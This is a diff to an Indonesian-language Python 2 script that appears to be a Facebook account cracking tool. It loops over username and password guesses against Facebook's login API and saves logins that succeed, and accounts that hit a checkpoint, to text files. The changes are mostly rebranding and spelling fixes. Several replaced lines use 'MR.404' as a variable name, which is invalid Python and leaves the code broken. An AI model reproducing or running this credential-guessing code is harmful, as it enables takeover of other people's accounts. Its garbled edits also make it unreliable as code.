@@ -129,16 +129,16 @@ def crack_dev(iqbal):
                                         }
         respon = requests.get('https://b-api.facebook.com/method/auth.login', params=parameter)
       
-        print '\033[91;1m {\033[97;1m'+str(c)+'\033[91;1m} \033[97;1m'+iqbal+ '\033[90;1m ==> Mencoba login '
+        print '\033[91;1m {\033[97;1m'+str(c)+'\033[91;1m} \033[97;1m'+MR.404+ '\033[90;1m ==> Mencoba login '
         if 'EAA' in respon.text:
-            print "\n\033[96;1m {\033[97;1mSuc\033[96;1m}\033[96;1m",iqbal,"\033[97;1m|\033[96;1m",pasw,'\n'
-            has_dev_suc.append('\033[96;1m {\033[97;1mSuc\033[96;1m} \033[97;1m'+iqbal+'\033[96;1m | \033[97;1m'+pasw)
+            print "\n\033[96;1m {\033[97;1mSuc\033[96;1m}\033[96;1m",MR.404,"\033[97;1m|\033[96;1m",pasw,'\n'
+            has_dev_suc.append('\033[96;1m {\033[97;1mSuc\033[96;1m} \033[97;1m'+MR.404+'\033[96;1m | \033[97;1m'+pasw)
             h = open('hasil_sukses.txt', 'a')
             h.write('[Suc] '+iqbal+' | '+pasw+' \n')
             h.close()
         elif 'www.facebook.com' in respon.json()['error_msg']:
-            print "\n\033[92;1m {\033[93;1mGet\033[92;1m}\033[92;1m",iqbal,"\033[97;1m|\033[92;1m",pasw,'\n'
-            has_dev_cek.append('\033[97;1m {\033[93;1mCek\033[97;1m} \033[93;1m'+iqbal+'\033[97;1m | \033[97;1m'+pasw)
+            print "\n\033[92;1m {\033[93;1mGet\033[92;1m}\033[92;1m",MR.404,"\033[97;1m|\033[92;1m",pasw,'\n'
+            has_dev_cek.append('\033[97;1m {\033[93;1mCek\033[97;1m} \033[93;1m'+MR.404+'\033[97;1m | \033[97;1m'+pasw)
             h = open('hasil_cekpoint.txt', 'a')
             h.write('[Cek] '+iqbal+' | '+pasw+' \n')
             h.close()
@@ -311,7 +311,7 @@ if __name__=="__main__":
             jumlah = input('\033[96;1m {\033[92;1m$\033[96;1m}\033[97;1m Masukkan Limit \033[94;1m:\033[93;1m ')
             if jumlah > 1000:
                 print '\033[91;1m----------------------------------------'
-                print ' \033[92;1mUps..  Maksmal Limit Hanya \033[93;1m1000 \033[92;1mBoss..'
+                print ' \033[92;1mUps..  Maksimal Limit Hanya \033[93;1m1000 \033[92;1mBoss..'
                 jumlah = 1000
             print "\033[96;1m=======================================\n"
             print "\033[96;1m     {\033[92;1m?\033[96;1m}\033[97;1m Sedang Mencari........ \033[96;1m/*\n"
@@ -353,7 +353,7 @@ if __name__=="__main__":
                 print " \n\n \033[97;1m        +++[ \033[96;1m Tools Versi "+versi+" \033[97;1m ]+++" 
                 print " "
                 print " \n\033[95;1m  SUBSCRIBE MY CHANNEL \033[96;1m(MR.404/RAIHAN)"
-                raw_input(" \033[97;1m    Tekan Enter Untuk Membuka Instagram..")
+                raw_input(" \033[97;1m    Tekan Enter Untuk Membuka youtube..")
                 subprocess.check_output(['am', 'start', 'https://youtube.com/channel/UC0IpDdp5KzL6RfX1RpUxU7Q'])
                 os.system('pro_dev.py' if os.name == 'nt' else 'python2 pro_dev.py')
             except KeyboardInterrupt:
